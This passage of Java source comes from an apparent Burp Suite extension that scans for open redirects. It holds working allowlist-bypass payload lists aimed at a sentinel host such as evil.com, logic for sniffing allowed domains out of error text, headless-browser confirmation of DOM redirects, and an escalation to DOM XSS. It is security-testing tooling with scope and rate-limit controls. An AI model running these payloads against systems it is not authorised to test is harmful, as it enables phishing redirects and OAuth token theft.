            try { if (!api.scope().isInScope(request.url())) return; }
            catch (Exception ignored) {}
        }

        for (String template : GENERIC_PATH_PAYLOADS)
        {
            if (cancelRequested && source != ScanSource.LIVE) return;

            String payload = template.replace("{HOST}", cfg.sentinelHost);
            String path = "/" + payload;
            String raw = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";

            HttpRequest attackRequest;
            HttpRequestResponse attackResult;
            try
            {
                attackRequest = HttpRequest.httpRequest(service, raw);
                attackResult = api.http().sendRequest(attackRequest);
            }
            catch (Exception e) { continue; }

            HttpResponse response = attackResult.response();
            if (response == null) continue;
            rateLimit();

            String location = response.headerValue("Location");
            if (location != null && hostMatchesSentinel(location, attackRequest.url()) && isRedirectStatus(response.statusCode()))
            {
                ChainResult chain = followRedirectChain(attackRequest, location, 3);
                report(attackResult, attackResult, "GET", "https://" + host + "/", "(root path)", "PATH", payload,
                        "Location: " + location + " — server/framework-level path-injection bug (no app redirect " +
                                "parameter involved), path tested: " + path +
                                (chain.hops > 0 ? " (followed " + chain.hops + " hop(s) -> final host: " + chain.finalHost + ")" : ""),
                        "CONFIRMED (generic path)", true, source);
                ui.log("[CONFIRMED (generic path)] host=" + host + " path='" + path + "' -> Location: " + location);
                return; // one confirmed hit per host is enough
            }
        }
    }

    // Login/SSO/auth-flow path keywords — used to flag "post-authentication redirect" findings,
    // a well-known high-value bug bounty pattern: the app only evaluates its redirect/continue
    // param AFTER a successful login/SSO flow, so unauthenticated-only scanning misses this class
    // of bug entirely. An authenticated session (already carried automatically once Burp captures
    // a logged-in user's traffic) is often all that's needed to trigger and confirm it.
    private static final String[] LOGIN_CONTEXT_KEYWORDS = {
            "login", "signin", "sign-in", "log-in", "auth", "authorize", "authenticate",
            "sso", "oauth", "oauth2", "openid", "saml", "callback", "session", "logout",
            "signout", "sign-out", "log-out"
    };

    private boolean isLoginContextUrl(String url)
    {
        if (url == null) return false;
        String lower = url.toLowerCase(Locale.ROOT);
        for (String kw : LOGIN_CONTEXT_KEYWORDS) if (lower.contains(kw)) return true;
        return false;
    }

    // Sensitive OAuth/SSO/CAS response parameters that, if present in the flow, get FORWARDED to
    // the attacker host when an open redirect fires on an auth endpoint — turning a "just a
    // redirect" (Low) finding into an account-takeover-chainable token/code leak (High). These are
    // exactly the cases (Tesla/BBC-style OAuth redirect_uri) that justify a higher severity.
    private static final Pattern SENSITIVE_FLOW_PARAM = Pattern.compile(
            "(?i)(?:^|[?&#])(code|token|access_token|id_token|refresh_token|session_state|state|" +
            "samlresponse|samlrequest|assertion|jwt|ticket|authorization|auth_token|id_token_hint)=");

    private static final Pattern OAUTH_PATH = Pattern.compile(
            "(?i)(oauth|/authorize|openid|saml|/sso|/connect/|/as/|/token|/callback|/idp|/adfs)");

    /**
     * Impact-chain heuristic: given the vulnerable request's URL, returns a short HIGH-IMPACT note
     * if this open redirect likely leaks an OAuth/SSO code or token to the attacker, else null.
     * Two signals: (1) the request URL already carries a sensitive flow param (code/token/SAML/…)
     * that would ride along to the attacker host; (2) the endpoint is clearly an OAuth/SSO authorize
     * or callback path, where a code/token is appended to the redirect target by design.
     */
    private String detectImpactChain(String url)
    {
        if (url == null) return null;
        java.util.regex.Matcher m = SENSITIVE_FLOW_PARAM.matcher(url);
        java.util.LinkedHashSet<String> leaked = new java.util.LinkedHashSet<>();
        while (m.find()) leaked.add(m.group(1).toLowerCase(Locale.ROOT));

        boolean oauthPath = OAUTH_PATH.matcher(url).find();

        if (!leaked.isEmpty())
            return "HIGH IMPACT: open redirect on a flow carrying " + leaked +
                    " — these are forwarded to the attacker host (token/code leak -> account takeover chain)";
        if (oauthPath)
            return "HIGH IMPACT: OAuth/SSO authorize/callback endpoint — a code/token is appended to the " +
                    "redirect target by design, so this redirect likely leaks it to the attacker";
        return null;
    }

    private boolean isCandidateParam(String name, String value)
    {
        if (name != null)
        {
            String lower = name.toLowerCase(Locale.ROOT);
            for (String hint : PARAM_NAME_HINTS) if (lower.contains(hint)) return true;
        }
        return value != null && !value.isEmpty() && URLISH_VALUE.matcher(value).find();
    }

    // =======================================================================
    // Smart Allowlist Bypass — builds target-specific bypass payloads instead of relying only on
    // a generic "trusted.example.com" placeholder. Many apps validate redirect targets against an
    // allowlist (commonly: "does the URL start with/contain our own domain?"), which classic
    // userinfo (@) and subdomain-confusion (.) tricks can bypass IF the "trusted" part used in the
    // payload is the app's ACTUAL domain — e.g. https://demo.testfire.net@evil.com/ or
    // https://demo.testfire.net.evil.com/ rather than a made-up placeholder domain.
    // =======================================================================

    /**
     * Anchors used: (1) the target's own HTTP host, (2) the host of the param's original/baseline
     * value if it's itself a URL (often literally the app's own "expected" destination), and
     * (3) a naive parent-domain guess (last two labels) in case the allowlist is scoped broader
     * than the exact subdomain. Returns payload TEMPLATES (still containing the {HOST} placeholder
     * for the sentinel substitution done by the caller, same convention as the category lists).
     */
    /**
     * Payloads that need the sentinel host itself transformed character-by-character (full percent
     * encoding, dot-to-%2E, double-encoded dot) rather than simple {HOST} substitution — these are
     * pre-resolved (no {HOST} placeholder left) and can be added straight into the template list.
     */
    private List<String> buildEncodingBypassPayloads(String sentinelHost)
    {
        List<String> payloads = new ArrayList<>();

        // Fully percent-encode every character of the host — bypasses naive plain-string domain checks
        StringBuilder fullyEncoded = new StringBuilder();
        for (char c : sentinelHost.toCharArray()) fullyEncoded.append(String.format("%%%02X", (int) c));
        payloads.add(PCT_HTTP_PREFIX + fullyEncoded);           // e.g. %68%74%74%70%3a%2f%2f%65%76%69%6c...
        payloads.add("%68%74%74%70%73%3a%2f%2f" + fullyEncoded); // same but https://

        // Single dot-to-%2E encoding within the host
        payloads.add("https://" + sentinelHost.replace(".", "%2E"));

        // Double-encoded dot (%25%32%65 decodes once to %2e, decodes again to a literal dot) —
        // catches backends that URL-decode twice.
        payloads.add("/%0D/" + sentinelHost.replace(".", "%25%32%65"));

        return payloads;
    }

    private List<String> buildSmartAllowlistPayloads(HttpRequest baseRequest, String baselineValue)
    {
        java.util.LinkedHashSet<String> anchors = new java.util.LinkedHashSet<>();

        try
        {
            String targetHost = baseRequest.httpService().host();
            if (targetHost != null && !targetHost.isEmpty()) anchors.add(targetHost);
        }
        catch (Exception ignored) {}

        if (baselineValue != null && !baselineValue.isEmpty())
        {
            try
            {
                String v = baselineValue.trim();
                if (!v.matches("^[a-zA-Z][a-zA-Z0-9+.\\-]*://.*")) v = "https://" + v.replaceFirst("^//", "");
                String h = URI.create(v).getHost();
                if (h != null && !h.isEmpty()) anchors.add(h);
            }
            catch (Exception ignored) {}
        }

        // naive parent-domain guess (last two labels) — a rough heuristic, not TLD-aware, but
        // catches the common "allow *.company.com" case from a "sub.company.com" anchor.
        for (String a : new java.util.ArrayList<>(anchors))
        {
            String[] parts = a.split("\\.");
            if (parts.length > 2) anchors.add(parts[parts.length - 2] + "." + parts[parts.length - 1]);
        }

        List<String> templates = new ArrayList<>();
        for (String anchor : anchors) templates.addAll(allowlistTemplatesForAnchor(anchor));
        return templates;
    }

    private List<String> allowlistTemplatesForAnchor(String anchor)
    {
        return java.util.Arrays.asList(
                "https://" + anchor + "@{HOST}/",
                "https://" + anchor + ".{HOST}/",
                "https://" + anchor + "%2540{HOST}/",   // double-encoded @
                "https://" + anchor + "%00.{HOST}/",
                "https://{HOST}#" + anchor + "/",
                "https://{HOST}?" + anchor + "/",
                // --- whitelist-bypass batch (user-supplied) ---
                anchor + "%40{HOST}",
                "https://" + anchor + "%5C%5C@{HOST}/",
                "https://{HOST}%5C%40" + anchor,
                "https://" + anchor + "/@{HOST}",
                "https://{HOST}\\@" + anchor,
                "https://" + anchor + "?{HOST}",
                "https://" + anchor + "\u00B0{HOST}",              // ° (degree sign) confusable
                "https://" + anchor + "%23{HOST}",
                "https://" + anchor + "%00{HOST}",
                "https://" + anchor + "%0A{HOST}",
                "https://" + anchor + "%0D{HOST}",
                "https://" + anchor + "%09{HOST}",
                "https://{HOST}\\\\." + anchor + "/",
                "https://{HOST}%E3%80%82%23." + anchor + "/",       // U+3002 ideographic full stop trick
                anchor + "%00https://{HOST}/",
                "https://" + anchor + "/http://{HOST}/",
                "http://{HOST}?" + anchor + "/",
                "https://{HOST}%E3%80%82" + anchor
        );
    }

    // Best-effort extraction of a domain the app's own error text mentions when it rejects a
    // redirect target, e.g. "Invalid redirect domain: foo.com" / "URL must be on bar.example.com".
    // Deliberately conservative: only looks near common deny/allow-list wording so it doesn't pick
    // up unrelated domains mentioned elsewhere on the page (ads, footers, etc).
    private static final Pattern ALLOWLIST_HINT = Pattern.compile(
            "(?:invalid|not allowed|disallowed|must (?:be|match)|only|whitelist|allow[- ]?list|denied)" +
            "[^\\n\"']{0,60}?([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9-]{1,63}){1,4})",
            Pattern.CASE_INSENSITIVE);

    private java.util.Set<String> sniffAllowlistDomains(String body)
    {
        java.util.Set<String> found = new java.util.LinkedHashSet<>();
        if (body == null) return found;
        java.util.regex.Matcher m = ALLOWLIST_HINT.matcher(body);
        while (m.find() && found.size() < 5)
        {
            String candidate = m.group(1).toLowerCase(Locale.ROOT);
            if (candidate.endsWith(cfg.sentinelHost.toLowerCase(Locale.ROOT))) continue; // ignore our own payload echoed back
            if (candidate.contains(".")) found.add(candidate);
        }
        return found;
    }

    private void testParam(HttpRequestResponse original, HttpRequest baseRequest, ParsedHttpParameter param, ScanSource source)
    {
        // --- Baseline (already have it — the unmodified original response, no extra request needed) ---
        HttpResponse baselineResponse = original.response();
        String baselineLocation = baselineResponse != null ? baselineResponse.headerValue("Location") : null;
        String baselineBody = baselineResponse != null ? baselineResponse.bodyToString() : null;
        boolean baselineAlreadyPointsToSentinel = baselineLocation != null && hostMatchesSentinel(baselineLocation, baseRequest.url());
        boolean baselineBodyAlreadyMentionsSentinel = baselineBody != null &&
                baselineBody.toLowerCase(Locale.ROOT).contains(cfg.sentinelHost.toLowerCase(Locale.ROOT));

        // --- Smart allowlist-bypass payloads, built from THIS target's own host + the param's
        // original (baseline) value — tried first since they're far more likely to succeed than
        // generic bypasses when the app validates redirects against an allowlist (e.g. only
        // accepts its own domain). Gated by its own Payloads-tab toggle (default off).
        List<String> smartTemplates = cfg.smartAllowlistEnabled
                ? buildSmartAllowlistPayloads(baseRequest, param.value()) : new ArrayList<>();

        // Effective payload list = CORE_ALWAYS_ON (always run) + every category switched on in the
        // Payloads sub-tab. Same list is used for every scan source now — category toggles are the
        // single control for scope/speed, replacing the old hardcoded live-vs-bulk split.
        List<String> allTemplates = new ArrayList<>(smartTemplates);
        allTemplates.addAll(buildEffectivePayloadList());
        // Encoding-transform payloads (fully percent-encoded host, dot-to-%2E, double-encoded dot)
        // are pre-resolved strings, not templates — gated by their own Payloads-tab toggle.
        if (cfg.encodingBypassEnabled) allTemplates.addAll(buildEncodingBypassPayloads(cfg.sentinelHost));

        HttpRequestResponse lastAttackResult = null;

        for (String template : allTemplates)
        {
            if (cancelRequested && source != ScanSource.LIVE) { ui.log("Scan cancelled — stopping param=" + param.name()); return; }

            String payload = template.replace("{HOST}", cfg.sentinelHost);

            HttpRequest attackRequest = baseRequest.withUpdatedParameters(
                    HttpParameter.parameter(param.name(), payload, param.type()));

            HttpRequestResponse attackResult;
            try { attackResult = api.http().sendRequest(attackRequest); }
            catch (Exception e) { ui.log("send failed: " + e); continue; }

            HttpResponse response = attackResult.response();
            if (response == null) continue;
            lastAttackResult = attackResult;

            rateLimit();

            // --- 1. Location header check, with baseline guard + status code validation ---
            String location = response.headerValue("Location");
            if (location != null && hostMatchesSentinel(location, attackRequest.url()) && isRedirectStatus(response.statusCode()))
            {
                if (baselineAlreadyPointsToSentinel)
                {
                    // App already redirects here regardless of our payload — not caused by us, skip.
                    continue;
                }

                // --- 2. Multi-step redirect chain follow (max 3 hops) to confirm final landing host ---
                ChainResult chain = followRedirectChain(attackRequest, location, 3);

                report(original, attackResult, baseRequest.method(), baseRequest.url(),
                        param.name(), param.type().toString(), payload,
                        "Location: " + location + (chain.hops > 0 ? " (followed " + chain.hops +
                                " hop" + (chain.hops > 1 ? "s" : "") + " -> final host: " + chain.finalHost + ")" : ""),
                        "CONFIRMED", true, source);
                return; // one confirmed hit per param is enough
            }
            else if (location != null && hostMatchesSentinel(location, attackRequest.url()) && !isRedirectStatus(response.statusCode()))
            {
                // Location header present but status code isn't a real redirect — worth a lower-confidence flag
                report(original, attackResult, baseRequest.method(), baseRequest.url(),
                        param.name(), param.type().toString(), payload,
                        "Location: " + location + " but status=" + response.statusCode() + " (not a 3xx — verify manually)",
                        "LOW", false, source);
                return;
            }

            // --- 3. JS/meta redirect body reflection, with baseline guard ---
            String body = response.bodyToString();
            if (!baselineBodyAlreadyMentionsSentinel && body != null)
            {
                String jsEvidence = findJsRedirectEvidence(body);
                if (jsEvidence != null)
                {
                    report(original, attackResult, baseRequest.method(), baseRequest.url(),
                            param.name(), param.type().toString(), payload,
                            "Client-side redirect: " + jsEvidence, "LIKELY", false, source);
                    return;
                }
            }
        }

        // --- 3b. Allowlist domain sniffing (second wave) ---
        // If the app blocked every attempt above but its response text reveals the allowlist rule
        // itself (e.g. "Invalid redirect domain: demo.testfire.net" or "URL must be on
        // testfire.net"), pull that domain out and retry with it as an extra anchor — catches
        // allowlists scoped to a domain we didn't already try from the request host / baseline value.
        if (lastAttackResult != null && lastAttackResult.response() != null)
        {
            String lastBody = lastAttackResult.response().bodyToString();
            java.util.Set<String> sniffedDomains = sniffAllowlistDomains(lastBody);
            List<String> extraTemplates = new ArrayList<>();
            for (String domain : sniffedDomains)
            {
                if (smartTemplates.stream().anyMatch(t -> t.contains(domain))) continue; // already tried
                extraTemplates.addAll(allowlistTemplatesForAnchor(domain));
            }
            for (String template : extraTemplates)
            {
                if (cancelRequested && source != ScanSource.LIVE) return;
                String payload = template.replace("{HOST}", cfg.sentinelHost);
                HttpRequest attackRequest = baseRequest.withUpdatedParameters(
                        HttpParameter.parameter(param.name(), payload, param.type()));

                HttpRequestResponse attackResult;
                try { attackResult = api.http().sendRequest(attackRequest); }
                catch (Exception e) { continue; }
                HttpResponse response = attackResult.response();
                if (response == null) continue;
                rateLimit();

                String location = response.headerValue("Location");
                if (location != null && hostMatchesSentinel(location, attackRequest.url()) && isRedirectStatus(response.statusCode())
                        && !baselineAlreadyPointsToSentinel)
                {
                    ChainResult chain = followRedirectChain(attackRequest, location, 3);
                    report(original, attackResult, baseRequest.method(), baseRequest.url(),
                            param.name(), param.type().toString(), payload,
                            "Location: " + location + " (allowlist-domain sniffed from blocked response, anchor from error text)" +
                                    (chain.hops > 0 ? " (followed " + chain.hops + " hop(s) -> final host: " + chain.finalHost + ")" : ""),
                            "CONFIRMED", true, source);
                    return;
                }
            }
        }

        // --- 4. DOM-based redirect fallback (headless) ---
        // If nothing was found via Location header or static-body regex, the app may still be
        // doing a client-side (JS-rendered) redirect after a short delay — common in SPA/Next.js/
        // React apps where the raw HTML response is just an empty shell and the actual redirect
        // logic lives in bundled JS, invisible to static regex matching. Only worth the cost of a
        // real headless browser launch when the app has no static signal at all.
        //
        // Tries several payload variants (not just one) because a WAF/edge filter (Akamai etc.)
        // may block one form (e.g. a full "https://evil.com" absolute URL) while letting a
        // differently-encoded bypass (e.g. protocol-relative "//evil.com") straight through. Smart
        // allowlist-anchor payloads (this target's own host / baseline value's host) go first here
        // too, same rationale as the main loop above.
        //
        // IMPORTANT: this never runs automatically for LIVE traffic unless cfg.domFallbackOnLive
        // is explicitly enabled — spinning up a real Chrome instance (multiple times, per payload)
        // for every page the user browses would make normal Proxy use unbearably slow. Bulk scans
        // and manually-sent requests always get it (that's an explicit, deliberate action).
        //
        // Also skipped entirely for non-URL (e.g. POST BODY) params — a headless browser's simple
        // .get(url) navigation has no way to carry a POST body, so there's no way to actually
        // reproduce the request that would trigger a client-side redirect sink for that param.
        boolean domFallbackAllowedForThisSource = (source != ScanSource.LIVE) || cfg.domFallbackOnLive;
        boolean domFallbackAllowedForThisParamType = (param.type() == HttpParameterType.URL);
        if (cfg.headlessFallback && headlessVerifier.available() && domFallbackAllowedForThisSource && domFallbackAllowedForThisParamType)
        {
            List<String> domTemplates = new ArrayList<>(smartTemplates);
            domTemplates.addAll(buildEffectivePayloadList());

            for (String template : domTemplates)
            {
                if (cancelRequested && source != ScanSource.LIVE) { ui.log("Scan cancelled — stopping DOM fallback for param=" + param.name()); return; }

                String payload = template.replace("{HOST}", cfg.sentinelHost);
                HttpRequest domCheckRequest = baseRequest.withUpdatedParameters(
                        HttpParameter.parameter(param.name(), payload, param.type()));

                ui.log("DOM fallback: trying payload '" + payload + "' for param=" + param.name() + "...");
                HeadlessVerifier.Result r = headlessVerifier.verify(domCheckRequest.url(), cfg.sentinelHost, cfg.headlessTimeoutSec);

                if (r.error != null)
                {
                    ui.log("DOM fallback error for param=" + param.name() + " payload='" + payload + "': " + r.error);
                    continue;
                }

                if (r.matchedSentinel)
                {
                    HttpRequestResponse domEvidence;
                    try { domEvidence = api.http().sendRequest(domCheckRequest); } catch (Exception e) { domEvidence = original; }

                    String sinkText = r.sinkInfo != null ? r.sinkInfo : "sink unknown (performance log unavailable)";
                    boolean postAuthContext = isLoginContextUrl(baseRequest.url());
                    String impact = detectImpactChain(baseRequest.url());
                    String domDetail = "DOM-based redirect (no Location header, confirmed via headless browser, final host: " +
                            hostOf(r.finalUrl) + "). Triggered by: " + sinkText;
                    if (impact != null) domDetail = "[" + impact + "] " + domDetail;
                    if (postAuthContext) domDetail = "[POST-AUTH REDIRECT CONTEXT] " + domDetail;
                    ResultRow row = new ResultRow(new Date(), baseRequest.method(), baseRequest.url(), param.name(),
                            param.type().toString(), payload, domDetail,
                            "CONFIRMED (DOM)", original, domEvidence, source);
                    row.highImpact = (impact != null);
                    row.headlessStatus = "CONFIRMED (host: " + hostOf(r.finalUrl) + " | raw final URL: " + r.finalUrl + ")";
                    model.addRow(row);
                    findings.incrementAndGet();
                    ui.refreshStats(monitored.get(), findings.get());
                    ui.log("[CONFIRMED (DOM)] " + baseRequest.method() + " param=" + param.name() +
                            " payload='" + payload + "' -> DOM-based redirect confirmed, final host=" + hostOf(r.finalUrl) +
                            " | sink: " + sinkText);
                    if (r.sinkDebug != null) ui.log("Sink attribution debug: " + r.sinkDebug);

                    // DOM XSS escalation check — only meaningful because we just confirmed this
                    // param actually reaches a client-side JS navigation sink (a server-side 302
                    // would never execute page JS, so this would be pointless there).
                    if (cfg.tryDomXss && headlessVerifier.available())
                    {
                        tryDomXssEscalation(original, baseRequest, param, source);
                    }
                    return; // one confirmed DOM hit per param is enough
                }
                else
                {
                    // No real host change — either blocked (WAF/error page) or genuinely not exploitable
                    // with this payload form. Log the final host so it's clear this wasn't a match, then
                    // try the next bypass variant.
                    ui.log("DOM fallback: payload '" + payload + "' did not redirect (final host: " + hostOf(r.finalUrl) + ")");
                }
            }
        }
    }

    private boolean isRedirectStatus(int status)
    {
        return status == 301 || status == 302 || status == 303 || status == 307 || status == 308;
    }

    private String hostOf(String urlString)
    {
        if (urlString == null) return "(null)";
        try { return URI.create(urlString).getHost(); }
        catch (Exception e) { return urlString; }
    }

    /**
     * Follows a redirect chain starting from the first Location header, up to maxHops times,
     * to confirm where the browser would actually end up landing (some apps bounce through an
     * intermediate internal page before finally redirecting externally, or vice versa).
     */
    private ChainResult followRedirectChain(HttpRequest originatingRequest, String firstLocation, int maxHops)
    {
        ChainResult result = new ChainResult();
        String currentLocation = firstLocation;
        HttpRequest currentRequest = originatingRequest;

        for (int hop = 0; hop < maxHops; hop++)
        {
            String absolute = resolveUrl(currentRequest.url(), currentLocation);
            if (absolute == null) break;

            HttpService service;
            String path;
            try
            {
                URI uri = URI.create(absolute);
                boolean secure = "https".equalsIgnoreCase(uri.getScheme());
                int port = uri.getPort() != -1 ? uri.getPort() : (secure ? 443 : 80);
                service = HttpService.httpService(uri.getHost(), port, secure);
                path = uri.getRawPath() == null || uri.getRawPath().isEmpty() ? "/" : uri.getRawPath();
                if (uri.getRawQuery() != null) path += "?" + uri.getRawQuery();
            }
            catch (Exception e) { break; }

            String raw = "GET " + path + " HTTP/1.1\r\nHost: " + service.host() + "\r\nConnection: close\r\n\r\n";
            HttpRequest nextRequest;
            HttpRequestResponse nextResult;
            try
            {
                nextRequest = HttpRequest.httpRequest(service, raw);
                nextResult = api.http().sendRequest(nextRequest);
            }
            catch (Exception e) { break; }

            result.hops = hop + 1;
            result.finalHost = service.host();

            HttpResponse nextResponse = nextResult.response();
            if (nextResponse == null) break;
            String nextLocation = nextResponse.headerValue("Location");
            if (nextLocation == null || !isRedirectStatus(nextResponse.statusCode())) break; // chain ended here

            currentLocation = nextLocation;
            currentRequest = nextRequest;
        }
        return result;
    }

    private String resolveUrl(String baseUrl, String location)
    {
        try
        {
            URI base = URI.create(baseUrl);
            URI resolved = base.resolve(location);
            return resolved.toString();
        }
        catch (Exception e) { return null; }
    }

    static class ChainResult
    {
        int hops = 0;
        String finalHost = "";
    }

    // Matches the value assigned inside common JS/meta redirect sinks, e.g.:
    //   window.location = "https://evil.com/"
    //   location.href='https://evil.com'
    //   <meta http-equiv="refresh" content="0;url=https://evil.com">
    // (anchor-href sink is built dynamically in findJsRedirectEvidence() since it depends on cfg.sentinelHost)
    private static final Pattern[] JS_REDIRECT_SINKS = {
            Pattern.compile("(?:window\\.)?location(?:\\.href|\\.replace\\(|\\.assign\\()?\\s*[=(]\\s*['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("top\\.location(?:\\.href)?\\s*=\\s*['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("self\\.location(?:\\.href)?\\s*=\\s*['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("document\\.location(?:\\.href)?\\s*=\\s*['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("http-equiv=[\"']refresh[\"'][^>]*content=[\"'][^\"']*url=([^\"'>]+)[\"']", Pattern.CASE_INSENSITIVE)
    };

    /**
     * Extracts the actual value assigned to a known JS/meta redirect sink and confirms it
     * really resolves to the sentinel host — instead of just checking whether the sentinel
     * string appears anywhere on the page (which produced false positives, e.g. the sentinel
     * host being echoed inside an unrelated comment or log line).
     */
    private String findJsRedirectEvidence(String body)
    {
        String sentinelLower = cfg.sentinelHost.toLowerCase(Locale.ROOT);

        for (Pattern p : JS_REDIRECT_SINKS)
        {
            java.util.regex.Matcher m = p.matcher(body);
            while (m.find())
            {
                String value = m.group(1);
                if (value != null && value.toLowerCase(Locale.ROOT).contains(sentinelLower))
                {
                    return p.pattern().startsWith("http-equiv") ? "meta-refresh -> " + value : "JS redirect -> " + value;
                }
            }
        }

        // Anchor href sink — built dynamically since the sentinel host is a runtime setting.
        Pattern anchorPattern = Pattern.compile(
                "<a\\s[^>]*href=[\"']([^\"']*" + Pattern.quote(sentinelLower) + "[^\"']*)[\"']", Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher am = anchorPattern.matcher(body);
        if (am.find()) return "anchor href -> " + am.group(1);

        return null;
    }

    private void rateLimit()
    {
        if (cfg.rateLimitMs <= 0) return;
        try { Thread.sleep(cfg.rateLimitMs); } catch (InterruptedException ignored) {}
    }

    /**
     * Determines whether a Location header value actually resolves to the sentinel host — the
     * way a REAL browser would resolve it against the request's own URL (RFC 3986 relative
     * reference resolution), not just a text substring check.
     *
     * This matters because a relative path like "/%0a/evil.com" resolves to
     * "https://payments.zuora.com/%0a/evil.com" (still the SAME host, evil.com is just part of
     * the path) — it never actually navigates the browser off-site, even though the text "evil.com"
     * appears in the header. Only a genuinely protocol-relative form ("//evil.com/...") — or a
     * backslash-based trick that browsers normalize into one, per the WHATWG URL spec's special-
     * scheme handling — really changes the host.
     */
    private boolean hostMatchesSentinel(String locationValue, String baseUrl)
    {
        if (locationValue == null) return false;
        String v = locationValue.trim();
        String sentinelLower = cfg.sentinelHost.toLowerCase(Locale.ROOT);
        if (!v.toLowerCase(Locale.ROOT).contains(sentinelLower)) return false; // cheap reject first

        try
        {
            // Browsers normalize backslashes to forward slashes for special schemes (http/https)
            // before resolving — replicate that so "/\evil.com" style tricks resolve the same way
            // a real browser would, rather than being judged as a plain (same-host) relative path.
            String normalized = v.replace('\\', '/');
            URI base = URI.create(baseUrl);
            URI resolved = base.resolve(normalized);
            String host = resolved.getHost();
            return host != null && host.toLowerCase(Locale.ROOT).endsWith(sentinelLower);
        }
        catch (Exception e)
        {
            return false; // can't resolve it -> can't confirm it actually goes off-site
        }
    }

    private boolean bodyIndicatesRedirect(String body)
    {
        // Superseded by findJsRedirectEvidence(), kept as a lightweight fallback substring check.
        String lower = body.toLowerCase(Locale.ROOT);
        String sentinelLower = cfg.sentinelHost.toLowerCase(Locale.ROOT);
        return lower.contains(sentinelLower) &&
               (lower.contains("http-equiv=\"refresh\"") || lower.contains("window.location") || lower.contains("document.location"));
    }

    /**
     * Escalation check: after a DOM-based (client-side JS) redirect sink is confirmed for this
     * param, retry with a javascript: URI instead of the sentinel host and check whether it
     * actually executes (a real native alert() dialog, detected via Selenium's Alert API — not
     * just a string reflected in the page, which could be a false positive from HTML-encoding).
     * Only called when that sink has just been confirmed — a server-side redirect never executes
     * page JS, so this would be meaningless there.
     */
    private void tryDomXssEscalation(HttpRequestResponse original, HttpRequest baseRequest, ParsedHttpParameter param, ScanSource source)
    {
        String xssPayload = "javascript:alert(document.domain)";
        HttpRequest xssRequest = baseRequest.withUpdatedParameters(
                HttpParameter.parameter(param.name(), xssPayload, param.type()));

        ui.log("Try DOM XSS: navigating headless browser with javascript: payload for param=" + param.name() + "...");
        HeadlessVerifier.DomXssResult xr = headlessVerifier.tryDomXss(xssRequest.url(), cfg.headlessTimeoutSec);

        if (xr.error != null)
        {
            ui.log("Try DOM XSS error for param=" + param.name() + ": " + xr.error);
            return;
        }

        if (xr.alertFired)
        {
            HttpRequestResponse xssEvidence;
            try { xssEvidence = api.http().sendRequest(xssRequest); } catch (Exception e) { xssEvidence = original; }

            ResultRow row = new ResultRow(new Date(), baseRequest.method(), baseRequest.url(), param.name(),
                    param.type().toString(), xssPayload,
                    "DOM XSS via redirect sink — javascript: URI executed, native alert() fired with text: \"" +
                            xr.alertText + "\". Confirms no scheme validation on the redirect sink, only domain filtering.",
                    "CONFIRMED (DOM XSS)", original, xssEvidence, source);
            model.addRow(row);
            findings.incrementAndGet();
            ui.refreshStats(monitored.get(), findings.get());
            ui.log("[CONFIRMED (DOM XSS)] " + baseRequest.method() + " param=" + param.name() +
                    " -> javascript: URI executed, alert text: \"" + xr.alertText + "\"");
        }
        else
        {
            ui.log("Try DOM XSS: no alert fired for param=" + param.name() +
                    " (scheme likely validated/stripped, or CSP blocked it) — final: " + xr.finalUrl);
        }
    }

    private void report(HttpRequestResponse original, HttpRequestResponse evidence, String method, String url,
                         String param, String type, String payload, String detail, String confidence,
                         boolean highConfidence, ScanSource source)
    {
        // Post-authentication redirect context flag (Scenario A — see conversation): if this URL
        // looks like a login/SSO/auth/callback endpoint, this finding is especially high-value —
        // it's exactly the class of bug that unauthenticated-only scanning misses entirely, and
        // (if Burp captured this from an already-logged-in user) the session was likely already
        // carried through automatically since we build attack requests from the original captured
        // request's cookies/headers.
        boolean postAuthContext = isLoginContextUrl(url);
        String impact = detectImpactChain(url);
        String taggedDetail = detail;
        if (impact != null) taggedDetail = "[" + impact + "] " + taggedDetail;
        if (postAuthContext) taggedDetail = "[POST-AUTH REDIRECT CONTEXT] " + taggedDetail;

        findings.incrementAndGet();
        ResultRow row = new ResultRow(new Date(), method, url, param, type, payload, taggedDetail, confidence, original, evidence, source);
        row.highImpact = (impact != null);
        model.addRow(row);
        ui.refreshStats(monitored.get(), findings.get());
        ui.log(String.format("[%s] %s param=%s type=%s source=%s -> %s", confidence, method, param, type, source.label, taggedDetail));

        if (cfg.highlight)
        {
            try
            {
                Annotations note = Annotations.annotations(
                        "Open Redirect (" + confidence + ") param=" + param + " payload=" + payload + " source=" + source.label +
                                (postAuthContext ? " [POST-AUTH]" : "") + (impact != null ? " [HIGH-IMPACT]" : ""));
                // best-effort: annotate the evidence pair we generated ourselves
                evidence.annotations().setNotes(note.notes());
                if (highConfidence) evidence.annotations().setHighlightColor(
                        burp.api.montoya.core.HighlightColor.RED);
                else evidence.annotations().setHighlightColor(
                        burp.api.montoya.core.HighlightColor.YELLOW);
            }
            catch (Exception ignored) {}
        }
    }

    // =======================================================================
    // Config
    // =======================================================================
    static class Config
    {
        boolean enabled = true;
        boolean enableGet = true; // GET / URL query-string params
        boolean testPostBody = false; // also test POST body form params — off by default; note
                                       // DOM/headless verification is skipped for these (a headless
                                       // browser's simple .get(url) navigation can't replicate a
                                       // POST submission), so only Location-header and static-body
                                       // checks apply to body params
        boolean highlight = true;
        boolean scopeOnly = true;
        boolean dedupEnabled = true; // skip re-testing the same (endpoint, param, type) combo this
                                      // session — big speed win on repeated endpoints; cleared on Clear Results
        int maxThreads = 5;
        int rateLimitMs = 100;
        int headlessTimeoutSec = 8;
        boolean headlessFallback = false; // slow — spins a real Chrome per param with no static signal
        boolean domFallbackOnLive = false; // if false (default), DOM/headless fallback only runs for
                                            // bulk scans (Proxy History/Site Map) and manually-sent
                                            // requests — never automatically while just browsing live
        boolean tryDomXss = false; // after a DOM-based redirect sink is confirmed, also try
                                    // javascript:alert(document.domain) and check for a real
                                    // native JS alert via Selenium's Alert API — escalation check,
                                    // off by default since it spins up yet another headless browser
        boolean stopAfterFirstFindingPerUrl = true; // once ANY param on a URL yields a finding,
                                    // stop testing the URL's other params/payloads (big speed win —
